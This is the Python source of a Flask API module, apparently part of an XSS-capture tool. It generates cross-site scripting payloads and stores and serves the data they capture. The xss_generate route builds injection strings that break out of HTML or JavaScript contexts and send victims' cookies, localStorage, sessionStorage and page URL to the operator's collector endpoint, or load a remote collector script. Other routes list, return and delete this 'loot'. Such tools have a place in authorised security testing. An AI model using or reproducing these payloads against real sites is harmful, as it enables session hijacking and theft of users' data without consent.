import json

from app import db
from app.api import bp
from app.decorators import permissions
from app.models import XSS, Client
from flask import jsonify, request
from flask_jwt_extended import jwt_required


@bp.route("/xss/generate", methods=["GET"])
@jwt_required
def xss_generate():
    """Generates an XSS payload"""

    parameters = request.args.to_dict()

    if "client_id" not in parameters:
        return jsonify({"status": "error", "detail": "Missing client_id parameter"}), 400
    if not parameters["client_id"].isnumeric():
        return jsonify({"status": "error", "detail": "Bad client ID"}), 400

    client = Client.query.filter_by(id=parameters["client_id"]).first_or_404()
    parameters.pop("client_id", None)
    uid = client.uid
    other_data = ""
    xss_type = "r"
    require_js = False
    require_params = False
    cookies = False
    local_storage = False
    session_storage = False
    get_url = False
    i_want_it_all = False
    code_type = "html"
    url = ""

    if "url" not in parameters.keys():
        return jsonify({"status": "error", "detail": "Missing url parameter"}), 400

    for param, value in parameters.items():

        if param == "url":
            url = value
        elif param == "i_want_it_all":
            i_want_it_all = True
        elif param == "stored":
            xss_type = "s"
        elif param == "cookies":
            cookies = True
            require_js = True
            require_params = True
        elif param == "local_storage":
            local_storage = True
            require_js = True
            require_params = True
        elif param == "session_storage":
            session_storage = True
            require_js = True
            require_params = True
        elif param == "code":
            if value == "html":
                code_type = "html"
            elif value == "js":
                code_type = "js"
                require_js = True
            else:
                return jsonify({"status": "error", "detail": "Unknown code type"}), 400
        elif param == "geturl":
            get_url = True
            require_js = True
            require_params = True
        else:
            if other_data != "":
                other_data += "&"
            other_data += "{}={}".format(param, value)
            require_params = True

    if i_want_it_all:
        if code_type == "js":
            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
                url, url, xss_type, uid, other_data
            )
            return (payload), 200
        else:
            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
                url, url, xss_type, uid, other_data
            )
            return (payload), 200

    if code_type == "js":
        payload = ';};new Image().src="'
    else:
        payload = """'>">"""
        if require_js:
            payload += '<script>new Image().src="'
        else:
            payload += '<img src="'

    payload += "{}/api/x/{}/{}".format(url, xss_type, uid)

    if require_params:
        payload += "?"

        if cookies:
            payload += 'cookies="+encodeURIComponent(document.cookie)'

        if local_storage:
            if cookies:
                payload += '+"&'
            payload += 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'

        if session_storage:
            if cookies or local_storage:
                payload += '+"&'
            payload += 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))'

        if get_url:
            if cookies or local_storage or session_storage:
                payload += '+"&'
            payload += 'origin_url="+encodeURIComponent(location.href)'

        if other_data != "":
            if cookies or local_storage or session_storage or get_url:
                payload += '+"&'
            payload += other_data
            payload += '"'

    if not require_params:
        payload += '"'

    if code_type == "js":
        payload += ";"
    else:
        if require_js:
            payload += "</script>"
        else:
            payload += " />"

    return (payload), 200


@bp.route("/xss/<int:xss_id>", methods=["GET"])
@jwt_required
def client_xss_get(xss_id):
    """Gets a single XSS instance for a client"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    return jsonify(xss.to_dict()), 200


@bp.route("/xss/<int:xss_id>", methods=["DELETE"])
@jwt_required
@permissions(one_of=["admin", "owner"])
def xss_delete(xss_id):
    """Deletes an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    db.session.delete(xss)
    db.session.commit()

    return jsonify({"status": "OK", "detail": "XSS deleted successfuly"}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["GET"])
@jwt_required
def xss_loot_get(xss_id, loot_type):
    """Gets a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    return jsonify({"data": data[loot_type]}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
@jwt_required
@permissions(one_of=["admin", "owner"])
def xss_loot_delete(xss_id, loot_type):
    """Deletes a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    data.pop(loot_type, None)

    xss.data = json.dumps(data)

    db.session.commit()

    return jsonify({"status": "OK", "detail": "Data deleted successfuly"}), 200


@bp.route("/xss", methods=["GET"])
@jwt_required
def client_xss_all_get():
    """Gets all XSS of a particular type (reflected of stored) for a specific client"""

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]
    if "type" in parameters:
        if parameters["type"] != "reflected" and parameters["type"] != "stored":
            return jsonify({"status": "error", "detail": "Unknown XSS type"}), 400
        filter_expression["xss_type"] = parameters["type"]

    xss_list = []
    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        xss_list.append(hit.to_dict_short())

    return jsonify(xss_list), 200


@bp.route("/xss/data", methods=["GET"])
@jwt_required
def client_loot_get():
    """Get all captured data for a client"""
    loot = {}

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]

    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        for element in json.loads(hit.data).items():
            if element[0] not in loot.keys():
                loot[element[0]] = []
            if element[0] == "fingerprint" or element[0] == "dom" or element[0] == "screenshot":
                loot[element[0]].append({hit.id: ""})
            else:
                loot[element[0]].append({hit.id: element[1]})

    return jsonify(loot), 200
